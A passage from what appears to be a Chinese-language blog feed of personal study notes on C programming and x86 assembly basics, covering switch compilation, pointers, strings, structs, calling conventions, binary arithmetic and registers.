class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;default\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现case的值有规律，但是从3到998差了很多，因此用EDX比例因子查内存地址的话，中间要差几百个default的地址，所以在这种情况下也不会使用EDX比例因子找，只会生成一堆JCC跳转指令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">006A5438 8B 45 F8             mov         eax,dword ptr [a]  </span><br><span class="line">006A543B 89 85 30 FF FF FF    mov         dword ptr [ebp-0D0h],eax  </span><br><span class="line">006A5441 81 BD 30 FF FF FF E6 03 00 00 cmp         dword ptr [ebp-0D0h],3E6h  </span><br><span class="line">006A544B 7F 29                jg          __$EncStackInitStart+0AAh (06A5476h)  </span><br><span class="line">006A544D 81 BD 30 FF FF FF E6 03 00 00 cmp         dword ptr [ebp-0D0h],3E6h  </span><br><span class="line">006A5457 74 64                je          __$EncStackInitStart+0F1h (06A54BDh)  </span><br><span class="line">006A5459 83 BD 30 FF FF FF 01 cmp         dword ptr [ebp-0D0h],1  </span><br><span class="line">006A5460 74 2E                je          __$EncStackInitStart+0C4h (06A5490h)  </span><br><span class="line">006A5462 83 BD 30 FF FF FF 02 cmp         dword ptr [ebp-0D0h],2  </span><br><span class="line">006A5469 74 34                je          __$EncStackInitStart+0D3h (06A549Fh)  </span><br><span class="line">006A546B 83 BD 30 FF FF FF 03 cmp         dword ptr [ebp-0D0h],3  </span><br><span class="line">006A5472 74 3A                je          __$EncStackInitStart+0E2h (06A54AEh)  </span><br><span class="line">006A5474 EB 74                jmp         __$EncStackInitStart+11Eh (06A54EAh)  </span><br><span class="line">006A5476 81 BD 30 FF FF FF E7 03 00 00 cmp         dword ptr [ebp-0D0h],3E7h  </span><br><span class="line">006A5480 74 4A                je          __$EncStackInitStart+100h (06A54CCh)  </span><br><span class="line">006A5482 81 BD 30 FF FF FF E8 03 00 00 cmp         dword ptr [ebp-0D0h],3E8h  </span><br><span class="line">006A548C 74 4D                je          __$EncStackInitStart+10Fh (06A54DBh)  </span><br><span class="line">006A548E EB 5A                jmp         __$EncStackInitStart+11Eh (06A54EAh) </span><br><span class="line"></span><br><span class="line">// 在这上面生成了好多JCC指令用来跳转</span><br><span class="line"></span><br><span class="line">006A5490 68 EC 7C 6A 00       push        offset string &quot;1111\n&quot; (06A7CECh)  </span><br><span class="line">006A5495 E8 38 BC FF FF       call        _printf (06A10D2h)  </span><br><span class="line">006A549A 83 C4 04             add         esp,4  </span><br><span class="line">006A549D EB 58                jmp         __$EncStackInitStart+12Bh (06A54F7h)  </span><br><span class="line">006A549F 68 F4 7C 6A 00       push        offset string &quot;2222\n&quot; (06A7CF4h)  </span><br><span class="line">006A54A4 E8 29 BC FF FF       call        _printf (06A10D2h)  </span><br><span class="line">006A54A9 83 C4 04             add         esp,4  </span><br><span class="line">006A54AC EB 49                jmp         __$EncStackInitStart+12Bh (06A54F7h)  </span><br><span class="line">006A54AE 68 20 7E 6A 00       push        offset string &quot;3333\n&quot; (06A7E20h)  </span><br><span class="line">006A54B3 E8 1A BC FF FF       call        _printf (06A10D2h)  </span><br><span class="line">006A54B8 83 C4 04             add         esp,4  </span><br><span class="line">006A54BB EB 3A                jmp         __$EncStackInitStart+12Bh (06A54F7h)  </span><br><span class="line">006A54BD 68 28 7E 6A 00       push        offset string &quot;4444\n&quot; (06A7E28h)  </span><br><span class="line">006A54C2 E8 0B BC FF FF       call        _printf (06A10D2h)  </span><br><span class="line">006A54C7 83 C4 04             add         esp,4  </span><br><span class="line">006A54CA EB 2B                jmp         __$EncStackInitStart+12Bh (06A54F7h)  </span><br><span class="line">006A54CC 68 30 7E 6A 00       push        offset string &quot;5555\n&quot; (06A7E30h)  </span><br><span class="line">006A54D1 E8 FC BB FF FF       call        _printf (06A10D2h)  </span><br><span class="line">006A54D6 83 C4 04             add         esp,4  </span><br><span class="line">006A54D9 EB 1C                jmp         __$EncStackInitStart+12Bh (06A54F7h)  </span><br><span class="line">006A54DB 68 38 7E 6A 00       push        offset string &quot;6666\n&quot; (06A7E38h)  </span><br><span class="line">006A54E0 E8 ED BB FF FF       call        _printf (06A10D2h)  </span><br><span class="line">006A54E5 83 C4 04             add         esp,4  </span><br><span class="line">006A54E8 EB 0D                jmp         __$EncStackInitStart+12Bh (06A54F7h)  </span><br><span class="line">006A54EA 68 E0 7C 6A 00       push        offset string &quot;default\n&quot; (06A7CE0h)  </span><br><span class="line">006A54EF E8 DE BB FF FF       call        _printf (06A10D2h)  </span><br><span class="line">006A54F4 83 C4 04             add         esp,4 </span><br></pre></td></tr></table></figure>

<p>因此当使用switch时，连续的case会提高代码的执行速度</p>
<h3 id="do…while"><a href="#do…while" class="headerlink" title="do…while"></a>do…while</h3><p>do…while一般用于先执行后判断</p>
<h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><p>for循环在反汇编中的形式</p>
<p><img src="/2023/12/15/c/image-20240108191715316.png" alt="image-20240108191715316"></p>
<p>for循环的执行效率可能不是特别高，但是可读性比较好，比较容易写</p>
<p>for循环的第一个和第三个表达式可以使用逗号连接多个表达式，比如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span> j;</span><br><span class="line"><span class="type">int</span> k;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>,j=<span class="number">0</span>,k=<span class="number">0</span>; i&lt;=<span class="number">10</span>, i++,j++,k++)</span><br><span class="line">&#123;</span><br><span class="line">	print(<span class="string">&quot;%d %d %d\n&quot;</span>, i, j, k);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="结构体数组"><a href="#结构体数组" class="headerlink" title="结构体数组"></a>结构体数组</h3><h3 id="结构体数组的定义"><a href="#结构体数组的定义" class="headerlink" title="结构体数组的定义"></a>结构体数组的定义</h3><h4 id="定义结构体"><a href="#定义结构体" class="headerlink" title="定义结构体"></a>定义结构体</h4><p><code>类型 变量名[常量表达式]</code></p>
<p>定义结构题类型<br>struct stStudent<br>{<br>    int Age;<br>    int Level;<br>}</p>
<p>定义结构体变量<br>struct stStudent st;</p>
<p>定义结构题数组<br>struct stStudent arr[10] 或者 stStudent arr[10]</p>
<p>结构体数组的赋值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MyStruct</span> <span class="title">arr</span>[3] =</span> &#123; &#123;<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">1</span>,<span class="number">1</span>&#125;,&#123;<span class="number">2</span>,<span class="number">2</span>&#125; &#125;;</span><br><span class="line">或</span><br><span class="line">arr[<span class="number">0</span>].Age = <span class="number">10</span>;</span><br><span class="line">arr[<span class="number">0</span>].Level = <span class="number">100</span>;</span><br></pre></td></tr></table></figure>

<img src="/2023/12/15/c/image-20240227084341723.png" alt="image-20240227084341723" style="zoom:50%;">

<h4 id="结构体数组中字符串成员的处理"><a href="#结构体数组中字符串成员的处理" class="headerlink" title="结构体数组中字符串成员的处理"></a>结构体数组中字符串成员的处理</h4><p><img src="/2023/12/15/c/image-20240227085527133.png" alt="image-20240227085527133"></p>
<h3 id="指针类型"><a href="#指针类型" class="headerlink" title="指针类型"></a>指针类型</h3><p>任何类型都可以带上<code>*</code>，加上<code>*</code>以后是新的类型，统称为“指针类型”。</p>
<p><code>*</code>可以是任意多个。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* x;</span><br><span class="line"><span class="type">short</span>* y;</span><br><span class="line"><span class="type">int</span>* z;</span><br><span class="line"><span class="type">float</span>* f;</span><br><span class="line"><span class="type">double</span>* d;</span><br><span class="line">Student* st;（结构体）</span><br></pre></td></tr></table></figure>

<p>指针变量的赋值</p>
<img src="/2023/12/15/c/image-20240227092130958.png" alt="image-20240227092130958" style="zoom:50%;"> 

<img src="/2023/12/15/c/image-20240227092215037.png" alt="image-20240227092215037" style="zoom: 50%;"> 

<p><strong>指针变量宽度</strong></p>
<p>指针类型的变量宽度永远是4字节、无论指针类型是什么，无论是几级指针</p>
<p><strong>指针变量的自加自减</strong></p>
<p>1、不带<code>*</code>类型的变量，++或者–都是加1或者减1<br>2、带<code>*</code>类型的变量，++或者–新增（减少）的数量是去掉一个<code>*</code>后变量的宽度</p>
<p>也就是当指针变量是一级指针时，指针自加后，char类型会加1，short类型会加2.int类型会加4</p>
<p>当指针变量是二级以上时，指针自加后，都会加4，因为这时去掉一个<code>*</code>后，宽度都是指针的宽度4.</p>
<p><strong>指针的加减运算</strong></p>
<p>指针不能进行乘除运算，只能加减。</p>
<p>当指针时多级指针时：</p>
<p><img src="/2023/12/15/c/image-20240227094643479.png" alt="image-20240227094643479"></p>
<p>当指针是一级指针时</p>
<p><img src="/2023/12/15/c/image-20240227094725042.png" alt="image-20240227094725042"></p>
<p>总结：</p>
<img src="/2023/12/15/c/image-20240227094928263.png" alt="image-20240227094928263" style="zoom:33%;"> 

<p><strong>指针取值方式</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(p+i)=p[i]</span><br><span class="line">*(*(p+i)+k)=p[i][k]</span><br><span class="line">*(*(*(p+i)+k)+m)=p[i][k][m]</span><br><span class="line">*(*(*(*(*(p+i)+k)+m)+w)+t)=p[i][k][m][W][t]</span><br><span class="line">*()与[]可以相互转换</span><br></pre></td></tr></table></figure>

<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="数组参数传递"><a href="#数组参数传递" class="headerlink" title="数组参数传递"></a>数组参数传递</h4><p>在反汇编中，<code>arr[i]</code>等价于<code>*(p+i)</code>，使用函数传递数组参数时，传递的是数组的首地址，并且传送时不会传递数组的宽度。要使用数组的宽度时，必须要把数组的宽度也传递进去。</p>
<p>在函数中使用数组，如果是按照指针传递的数组，在使用时也可以按照数组来使用；如果是按照数组传递的参数，也可以按照指针的方式来使用。</p>
<h3 id="字符串-1"><a href="#字符串-1" class="headerlink" title="字符串"></a>字符串</h3><h4 id="字符串的定义方式"><a href="#字符串的定义方式" class="headerlink" title="字符串的定义方式"></a>字符串的定义方式</h4><ol>
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> str[<span class="number">5</span>] = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str);</span><br></pre></td></tr></table></figure>

<p>程序会找到<code>&#39;\0&#39;</code>或者<code>0</code>来停止寻找字符串</p>
<ol start="2">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> str[] = <span class="string">&quot;ABCDEF&quot;</span>;		<span class="comment">// 在常量区找一段空间放，然后在复制到数组中，因为复制到数组中才可以对其进行修改，比如str[0]=‘K&#x27;，然后就变成了&quot;KBCDE&quot;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li></li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* str = <span class="string">&quot;ABCDE&quot;</span></span><br></pre></td></tr></table></figure>

<p>这种方式是将字符串放在了常量区，但是没有复制到字符数组中，所以这样定义的字符串只能读，不能写（也有可以改的方法）</p>
<h4 id="处理字符串函数"><a href="#处理字符串函数" class="headerlink" title="处理字符串函数"></a>处理字符串函数</h4><p><strong>1.int strlrn(char *  str)</strong></p>
<p>返回值是字符串s的长度。不包括结束符’\0’。、</p>
<p><strong>2.char * strcpy(char * dest, char * src);</strong></p>
<p>复制字符串src到dest中，返回值为dest的值。</p>
<p><strong>3.char * strcat(char * dest, char * src);</strong></p>
<p>将字符串src添加到dest尾部，返回值为dest的值。</p>
<p><strong>4.int strcmp(char * str1, char * str2);</strong></p>
<p>一样返回0，不一样返回非0</p>
<h3 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h3><p>首先定义一个结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	<span class="type">int</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>给结构体赋值、定义结构体指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Point p = &#123; <span class="number">1</span>, <span class="number">2</span> &#125;;</span><br><span class="line">Point* px = &amp;p;</span><br></pre></td></tr></table></figure>

<p>通过指针读取结构体时不用<code>.</code>，而是用<code>-&gt;</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x = px-&gt;x		| x = <span class="number">1</span></span><br><span class="line"><span class="type">int</span> y = px-&gt;y		| y = <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>通过结构体指针修改结构体成员数值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">px-&gt;y = <span class="number">100</span>			| y = <span class="number">100</span></span><br></pre></td></tr></table></figure>

<h3 id="指针数组-与-数组指针"><a href="#指针数组-与-数组指针" class="headerlink" title="指针数组 与 数组指针"></a>指针数组 与 数组指针</h3><h4 id="指针数组的赋值"><a href="#指针数组的赋值" class="headerlink" title="指针数组的赋值"></a>指针数组的赋值</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> * a = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> * b = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line"></span><br><span class="line">&lt;<span class="number">1</span>&gt;</span><br><span class="line"><span class="type">char</span> * arr[<span class="number">2</span>] = &#123;a, b&#125;;</span><br><span class="line"></span><br><span class="line">&lt;<span class="number">2</span>&gt;</span><br><span class="line"><span class="type">char</span> * arr[<span class="number">2</span>];</span><br><span class="line">arr[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">arr[<span class="number">1</span>] = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&lt;<span class="number">3</span>&gt;</span><br><span class="line"><span class="type">char</span> * arr[<span class="number">2</span>] = &#123;</span><br><span class="line">	<span class="string">&quot;Hello&quot;</span>,</span><br><span class="line">	<span class="string">&quot;张三&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="数组指针的定义"><a href="#数组指针的定义" class="headerlink" title="数组指针的定义"></a>数组指针的定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>(*px) [<span class="number">5</span>];			<span class="comment">//一维数组指针</span></span><br><span class="line"><span class="type">char</span>(*px) [<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>(*px)[<span class="number">2</span>][<span class="number">2</span>];			<span class="comment">//二维数组指针</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>(*px)[<span class="number">3</span>][<span class="number">3</span>][<span class="number">3</span>];		<span class="comment">//三维数组指针</span></span><br></pre></td></tr></table></figure>

<p><strong><code>int* p[5]</code>和<code>int (*p)[5]</code>的区别：</strong></p>
<p><code>int* p[5]</code>：<code>[]</code>的优先级高于<code>*</code>，所以<code>int* p[]</code>是一个<code>(int*)</code>类型的指针数组，p本质上是一个<strong>数组</strong>；</p>
<p><code>int (*p)[5]</code>：<code>()</code>的优先级高于<code>[]</code>，所以p先与<code>*</code>结合，是一个指针，指针的类型是一个<code>int[]</code>数组，<code>int (*p)[]</code>是一个数组指针，p本质上是一个<strong>指针</strong>。</p>
<p><strong>???</strong></p>
<p><img src="/2023/12/15/c/image-20240228003021496.png" alt="image-20240228003021496"></p>
<p><img src="/2023/12/15/c/image-20240228004935994.png" alt="image-20240228004935994"></p>
<h3 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h3><table>
<thead>
<tr>
<th>调用约定</th>
<th>参数压栈顺序</th>
<th>平衡堆栈方式</th>
</tr>
</thead>
<tbody><tr>
<td>__cdecl</td>
<td>从右至左入栈</td>
<td>调用者清理栈</td>
</tr>
<tr>
<td>__stdcall</td>
<td>从右至左入栈</td>
<td>自身清理堆栈</td>
</tr>
<tr>
<td>__fastcall</td>
<td>ECX&#x2F;EDX传递前两个参数，剩下还多的，从右至左入栈</td>
<td>自身清理堆栈</td>
</tr>
</tbody></table>
<h3 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h3><p><strong>定义函数指针变量：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> (__cdecl *pFun)(<span class="type">int</span>, <span class="type">int</span>);</span><br></pre></td></tr></table></figure>

<p><strong>为指针变量赋值：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pFun = (<span class="type">int</span> (__cdecl *)(<span class="type">int</span>, <span class="type">int</span>))<span class="number">10</span>;		<span class="comment">// 这里随便赋了一个10，使用时应该赋一个函数的地址</span></span><br></pre></td></tr></table></figure>

<p><strong>使用函数指针变量：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> r = pFun(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编</title>
    <url>/2023/12/10/compilation/</url>
    <content><![CDATA[<h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><h2 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h2><h3 id="二进制与十六进制"><a href="#二进制与十六进制" class="headerlink" title="二进制与十六进制"></a>二进制与十六进制</h3><p>十六进制相当于二进制的简写，可以看成二进制的另一种形式</p>
<table>
<thead>
<tr>
<th>二进制</th>
<th>十六进制</th>
</tr>
</thead>
<tbody><tr>
<td>0000</td>
<td>0</td>
</tr>
<tr>
<td>0001</td>
<td>1</td>
</tr>
<tr>
<td>0010</td>
<td>2</td>
</tr>
<tr>
<td>0011</td>
<td>3</td>
</tr>
<tr>
<td>0100</td>
<td>4</td>
</tr>
<tr>
<td>0101</td>
<td>5</td>
</tr>
<tr>
<td>0110</td>
<td>6</td>
</tr>
<tr>
<td>0111</td>
<td>7</td>
</tr>
<tr>
<td>1000</td>
<td>8</td>
</tr>
<tr>
<td>1001</td>
<td>9</td>
</tr>
<tr>
<td>1010</td>
<td>A</td>
</tr>
<tr>
<td>1011</td>
<td>B</td>
</tr>
<tr>
<td>1100</td>
<td>C</td>
</tr>
<tr>
<td>1101</td>
<td>D</td>
</tr>
<tr>
<td>1110</td>
<td>E</td>
</tr>
<tr>
<td>1111</td>
<td>F</td>
</tr>
</tbody></table>
<h3 id="数据宽度"><a href="#数据宽度" class="headerlink" title="数据宽度"></a>数据宽度</h3><h4 id="数据宽度-1"><a href="#数据宽度-1" class="headerlink" title="数据宽度"></a>数据宽度</h4><span id="more"></span>

<p>  数学上的数字，是没有大小限制的，可以无限的大。但在计算机中，由于受硬件的制约，数据都是有长度限制的（称为数据宽度），超过最多宽度的数据会被丢弃</p>
<h4 id="计算机中常见的数据宽度"><a href="#计算机中常见的数据宽度" class="headerlink" title="计算机中常见的数据宽度"></a>计算机中常见的数据宽度</h4><p>(1)位(BIT) 在计算机中存储数据的最小单位 能存一个1或一个0</p>
<p>(2)字节(Byte) 一个字节能存储8个0或1 范围从00000000<del>11111111 即0</del>0xFF</p>
<p>(3)字(Word) 能存16个0或1 0~0xFFFF</p>
<p>(4)双字(Doubleword) 存储32个0或1 0~0xFFFFFFFF</p>
<p><strong>如果要存储的数据超过最大宽度，那么多余的数据将被丢弃</strong></p>
<h3 id="无符号数"><a href="#无符号数" class="headerlink" title="无符号数"></a>无符号数</h3><p>无符号数的编码规则：数是多少就存多少</p>
<p>1001 1010 &#x3D;&gt; 9A</p>
<p>有符号数的编码规则：最高位是0，则该数为正数；最高位是1，则该数为负数</p>
<p>当该数为正时，编码规则与无符号数相同</p>
<!--more-->

<h3 id="原码，反码，补码"><a href="#原码，反码，补码" class="headerlink" title="原码，反码，补码"></a>原码，反码，补码</h3><h4 id="正数："><a href="#正数：" class="headerlink" title="正数："></a>正数：</h4><p><strong>原码：</strong>最高位为0，其余位为数值本身</p>
<p><strong>反码：</strong>正数的反码与原码相同</p>
<p><strong>补码：</strong>正数的补码与原码相同</p>
<p>6： 0000 0110</p>
<h4 id="负数："><a href="#负数：" class="headerlink" title="负数："></a>负数：</h4><p><strong>原码：</strong>最高位是1，其余位为数值本身的绝对值<br>​	-7： 1000 0111<br><strong>反码：</strong>除最高位，其他位1变0,0变1（除最高位取反）<br>​	-7： 1111 1000<br><strong>补码：</strong>负数的补码为反码+1<br>​	-7： 1111 1001</p>
<h4 id="假设数据宽度为1BYTE（8BIT）"><a href="#假设数据宽度为1BYTE（8BIT）" class="headerlink" title="假设数据宽度为1BYTE（8BIT）"></a>假设数据宽度为1BYTE（8BIT）</h4><p>无符号数：0 1 2 3 4   …………    FF（10进制255）</p>
<p>有符号数：<br>​	正数：0  ……7F</p>
<p>​	负数：FF……80</p>
<h4 id="假设数据宽度为Doubleword（32BIT）"><a href="#假设数据宽度为Doubleword（32BIT）" class="headerlink" title="假设数据宽度为Doubleword（32BIT）"></a>假设数据宽度为Doubleword（32BIT）</h4><p>无符号数：0 1 2 3 4 …… FFFFFFFF</p>
<p>有符号数：<br>​	正数：0 …… 7FFFFFFF</p>
<p>​	负数：FFFFFFFF …… 80000000</p>
<h3 id="计算机如何运算-位运算"><a href="#计算机如何运算-位运算" class="headerlink" title="计算机如何运算 &#x3D;&gt; 位运算"></a>计算机如何运算 &#x3D;&gt; 位运算</h3><p>计算机只认识0和1，计算机只能对0和1做运算（通常称为位运算）</p>
<h4 id="1-与运算"><a href="#1-与运算" class="headerlink" title="1.与运算"></a>1.与运算</h4><p>当两个位都为1时，结果才为1	比如：</p>
<p>​						1011 0001<br>​and(&amp;)		 	1101 1000<br>​———————————-<br>​						1001 0000</p>
<h4 id="2-或运算"><a href="#2-或运算" class="headerlink" title="2.或运算"></a>2.或运算</h4><p>只要有一个为1就是1</p>
<p>​						1011 0001<br>​or(|)			 	1101 1000<br>​———————————-<br>​						1111 1001</p>
<h4 id="3-异或运算"><a href="#3-异或运算" class="headerlink" title="3.异或运算"></a>3.异或运算</h4><p>不一样的时候是1</p>
<p>​						1011 0001<br>​xor(^)			   1101 1000<br>​———————————-<br>​						0110 1001</p>
<h4 id="4-非运算"><a href="#4-非运算" class="headerlink" title="4.非运算"></a>4.非运算</h4><p>0就是1 1就是0</p>
<p>not(~)			   1101 1000<br>​———————————-<br>​				 		0010 0111</p>
<h4 id="5-左移"><a href="#5-左移" class="headerlink" title="5.左移"></a>5.左移</h4><p>各二进位全部左移若干位，高位丢弃，低位补0</p>
<p>shl(&lt;&lt;)		1101 1000 左移2位为：0110 0000</p>
<h4 id="6-右移"><a href="#6-右移" class="headerlink" title="6.右移"></a>6.右移</h4><p>各二进位全部右移若干位，低位丢弃，高位补0或者补符号位</p>
<h5 id="shr"><a href="#shr" class="headerlink" title="shr"></a><strong>shr</strong></h5><p>1101 0101	&#x3D;右移2位&gt;	 0011 0101<br>对应C语言(&gt;&gt;)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a&gt;&gt;<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<h5 id="sar"><a href="#sar" class="headerlink" title="sar"></a><strong>sar</strong></h5><p>1101 0101	&#x3D;&gt; 	1111 0101<br>对应C语言(&gt;&gt;)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a&gt;&gt;<span class="number">2</span>);</span><br></pre></td></tr></table></figure>



<h3 id="通过位运算实现四则运算"><a href="#通过位运算实现四则运算" class="headerlink" title="通过位运算实现四则运算"></a>通过位运算实现四则运算</h3><h4 id="加"><a href="#加" class="headerlink" title="加"></a>加</h4><p>如：4+5的运算过程</p>
<p><strong>1）异或</strong></p>
<p>​				0000 0100<br>​				0000 0101<br>异或———————<br>​				0000 0001</p>
<p><strong>2）判断是否有进位</strong></p>
<p>​				0000 0100<br>​				0000 0101<br>与————————<br>​				0000 0100</p>
<p><strong>3）进位不为零 &#x3D;&gt; 左移</strong></p>
<p>​				0000 0100<br>左移———————-<br>​				0000 1000</p>
<p><strong>4）异或 &#x3D;&gt; 将第一次异或的值与进位后得到的值再异或</strong></p>
<p>​				0000 0001<br>​				0000 1000<br>异或———————-<br>​				0000 1001</p>
<p><strong>5）判断是否有进位</strong></p>
<p>​				0000 0001<br>​				0000 1000<br>与————————<br>​				0000 0000</p>
<p><strong>没有进位，就是加的结果</strong></p>
<h4 id="减"><a href="#减" class="headerlink" title="减"></a>减</h4><p>4-5的运算过程</p>
<p>4-5即4+(-5)</p>
<p><strong>1）异或</strong></p>
<p>​				0000 0100<br>​				1111 1011<br>异或———————-<br>​				1111 1111</p>
<p><strong>2）判断是否有进位</strong></p>
<p>​				0000 0100<br>​				1111 1011<br>与————————<br>​				0000 0000</p>
<p><strong>所以4-5的结果就为1111 1111 &#x3D; FF &#x3D; -1</strong></p>
<h4 id="乘"><a href="#乘" class="headerlink" title="乘"></a>乘</h4><p>X * Y 即X个Y相加</p>
<h4 id="除"><a href="#除" class="headerlink" title="除"></a>除</h4><p>X &#x2F; Y 本质为减法  X能减去多少个Y</p>
<h2 id="汇编-1"><a href="#汇编-1" class="headerlink" title="汇编"></a>汇编</h2><p><img src="/2023/12/10/compilation/image-20231212151255758.png" alt="image-20231212151255758"></p>
<h3 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1.寄存器"></a>1.寄存器</h3><p>存储数据  CPU &gt; 内存 &gt; 硬盘</p>
<p>32位CPU：8  16  32<br>64位CPU：8  16  32  64</p>
<h3 id="2-通用寄存器"><a href="#2-通用寄存器" class="headerlink" title="2.通用寄存器"></a>2.通用寄存器</h3><p>32位寄存器：</p>
<p>EAX</p>
<p>ECX</p>
<p>EDX</p>
<p>EBX</p>
<p>ESP</p>
<p>EBP</p>
<p>ESI</p>
<p>EDI</p>
<h3 id="3-MOV指令"><a href="#3-MOV指令" class="headerlink" title="3.MOV指令"></a>3.MOV指令</h3><p>（1）MOV立即数到寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 1</span><br></pre></td></tr></table></figure>

<p>MOV寄存器到寄存器（将eax存的值赋值到ebx）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ebx, eax </span><br></pre></td></tr></table></figure>

<img src="/2023/12/10/compilation/image-20231212185902221.png" alt="image-20231212185902221" style="zoom:50%;">





<h3 id="4-16位寄存器，8位寄存器"><a href="#4-16位寄存器，8位寄存器" class="headerlink" title="4.16位寄存器，8位寄存器"></a>4.16位寄存器，8位寄存器</h3><p><img src="/2023/12/10/compilation/image-20231212191059169.png" alt="image-20231212191059169"><br><img src="/2023/12/10/compilation/image-20231212191212571.png" alt="image-20231212191212571" style="zoom:100%;"><br><img src="/2023/12/10/compilation/image-20231212191247696.png" alt="image-20231212191247696"><br><img src="/2023/12/10/compilation/image-20231212191318028.png" alt="image-20231212191318028"><br><img src="/2023/12/10/compilation/image-20231212191335820.png" alt="image-20231212191335820"></p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th>通用寄存器</th>
</tr>
</thead>
<tbody><tr>
<td>32位</td>
<td>16位</td>
<td>8位</td>
</tr>
<tr>
<td>EAX</td>
<td>AX</td>
<td>AL</td>
</tr>
<tr>
<td>ECX</td>
<td>CX</td>
<td>CL</td>
</tr>
<tr>
<td>EDX</td>
<td>DX</td>
<td>DL</td>
</tr>
<tr>
<td>EBX</td>
<td>BX</td>
<td>BL</td>
</tr>
<tr>
<td>ESP</td>
<td>SP</td>
<td>AH</td>
</tr>
<tr>
<td>EBP</td>
<td>BP</td>
<td>CH</td>
</tr>
<tr>
<td>ESI</td>
<td>SI</td>
<td>DH</td>
</tr>
<tr>
<td>EDI</td>
<td>DI</td>
<td>BH</td>
</tr>
</tbody></table>
<p><img src="/2023/12/10/compilation/image-20231212192419732.png" alt="image-20231212192419732"></p>
<p><img src="/2023/12/10/compilation/image-20231212192619129.png" alt="image-20231212192619129"></p>
<p>8位寄存器</p>
<img src="/2023/12/10/compilation/image-20231212192939039.png" alt="image-20231212192939039" style="zoom:50%;">

<img src="/2023/12/10/compilation/image-20231212193232979.png" alt="image-20231212193232979" style="zoom:50%;">

<h3 id="5-内存"><a href="#5-内存" class="headerlink" title="5.内存"></a>5.内存</h3><h4 id="1-每个应用层序都会有自己的独立的4GB内存空间"><a href="#1-每个应用层序都会有自己的独立的4GB内存空间" class="headerlink" title="1.每个应用层序都会有自己的独立的4GB内存空间"></a>1.每个应用层序都会有自己的独立的4GB内存空间</h4><img src="/2023/12/10/compilation/image-20231212194824981.png" alt="image-20231212194824981" style="zoom:50%;">

